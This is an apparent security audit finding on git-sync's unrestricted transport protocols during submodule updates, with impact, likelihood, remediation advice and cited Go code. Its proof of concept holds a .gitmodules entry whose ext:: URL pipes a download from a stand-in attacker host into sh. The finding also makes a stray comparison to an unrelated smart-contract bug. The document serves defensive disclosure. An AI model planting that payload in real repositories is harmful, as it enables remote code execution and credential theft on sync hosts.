### Title
Unrestricted Git Transport Protocols Allow Command Execution via Malicious Submodule URL During `git submodule update` - (File: main.go)

### Summary
`git-sync` runs `git submodule update --init [--recursive]` on every worktree checkout without ever configuring `protocol.*.allow` / `GIT_ALLOW_PROTOCOL` restrictions. A repository owner (or anyone with push access to a branch/tag/ref that git-sync is configured to follow) can add a `.gitmodules` entry whose submodule URL uses a dangerous transport (e.g. `ext::`) or a path that git interprets as command-line options. Because git-sync passes this URL straight into `git submodule update --init` with no allow-listing or validation, the untrusted repo content directly drives a privileged `git` invocation that can execute arbitrary commands on the git-sync host, analogous to the reported TOFT bug where an unvalidated externally-supplied address (`removeParams.market`) was trusted for a privileged call.

### Finding Description
`configureWorktree()` unconditionally executes submodule initialization whenever submodules are not disabled, using arguments built purely from local flags — no filtering of the submodule URLs pulled from the synced repository's `.gitmodules` file is performed: [1](#0-0) 

The URLs referenced by `git submodule update --init` come entirely from the tracked branch/tag content of `--repo` (or from nested submodules), i.e. from untrusted, attacker-influenced repo content once a malicious commit is merged/pushed to the ref git-sync follows.

A search of `main.go` for any protocol allow-listing (`protocol.*.allow`, `GIT_ALLOW_PROTOCOL`) found none; the only occurrences of `protocol.file.allow=always` in the codebase are in the e2e test harness itself (`test_e2e.sh`), used only to let *local test fixtures* add file:// submodules — they are not part of the production `repoSync` code path. This means git-sync relies solely on the git binary's own default protocol safety, and never actively restricts which transports (`ext::`, arbitrary helper schemes, etc.) submodule URLs may use.

This mirrors the audited bug class exactly: a parameter that originates from external/untrusted input (there: `removeParams.market`; here: submodule URL/path in `.gitmodules`) is passed unchecked into a privileged operation (there: `approve()` + external call; here: constructing and running a `git` subprocess) with no validation, whitelist, or sandboxing layer added by the application itself.

### Impact Explanation
If reachable (see Likelihood), this results in arbitrary command execution in the git-sync container/process, which typically has access to:
- Git credentials/SSH keys/cookie files mounted for authentication (`--ssh-key-file`, `--cookie-file`, `--password-file`, etc.),
- The `--root` filesystem, allowing file write/delete outside the intended `--link` target,
- Whatever network access the sidecar has (potential SSRF / lateral movement).

This satisfies the "Accept" criteria: code execution, credential disclosure, and file write/delete outside `--root` are all plausible outcomes.

### Likelihood Explanation
Likelihood is contingent on git's own transport safety and version. Modern git releases already restrict `ext::`/unsafe protocols for submodules recursed via `submodule update` unless the operator explicitly enables them (as a partial mitigation following CVE-2017-1000117/CVE-2018-11235-class fixes), and this defense lives entirely in the vendored/system `git` binary, not in git-sync's own code. Because git-sync adds **zero** additional protocol restriction of its own (`--git-config`/`GIT_ALLOW_PROTOCOL` are never set for submodule operations), any regression, misconfiguration, or reliance-on-git-defaults gap directly exposes this path. The finding is therefore a real gap in git-sync's defense-in-depth (missing an explicit allow-list it could easily add), even though full exploitability depends on the installed git version's own submodule protocol enforcement — which is a dependency-level factor outside git-sync's control.

### Recommendation
- Explicitly set a strict submodule/transport allow-list before invoking any submodule commands, e.g. run `git -c protocol.allow=never -c protocol.file.allow=never -c protocol.ext.allow=never -c protocol.http.allow=user -c protocol.https.allow=user -c protocol.ssh.allow=user submodule update --init ...` (or set `GIT_ALLOW_PROTOCOL` in the subprocess environment) so git-sync does not rely solely on the git binary's own defaults.
- Consider validating/whitelisting submodule remote URLs against the same host/scheme as `--repo` (or an operator-supplied allow-list) before allowing `--submodules` to recurse into arbitrary attacker-supplied targets.

### Proof of Concept
1. Configure git-sync with `--submodules=recursive` (or the default) tracking a branch on an attacker-writable repo.
2. Attacker pushes a commit adding `.gitmodules` with a submodule entry using a dangerous transport, e.g.:
   ```
   [submodule "evil"]
       path = evil
       url = ext::sh -c "curl attacker.example/x | sh"
   ```
3. On the next sync, `configureWorktree()` runs: [2](#0-1) 
   which executes `git submodule update --init [--recursive]` against the new `.gitmodules`, and (absent any protocol allow-list configured by git-sync itself) git may invoke the `ext::` helper, executing the attacker's command inside the git-sync process/container.

Note: full confirmation that this is exploitable end-to-end depends on the exact git version bundled in the git-sync image and its default `protocol.*.allow` settings, which this static analysis of the repository index cannot verify without running the actual binary; the code-level gap (git-sync never adds its own protocol restriction) is confirmed by the absence of any `protocol.` / `GIT_ALLOW_PROTOCOL` configuration anywhere in `main.go`.

### Citations

**File:** main.go (L1733-1747)
```go
	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}
```
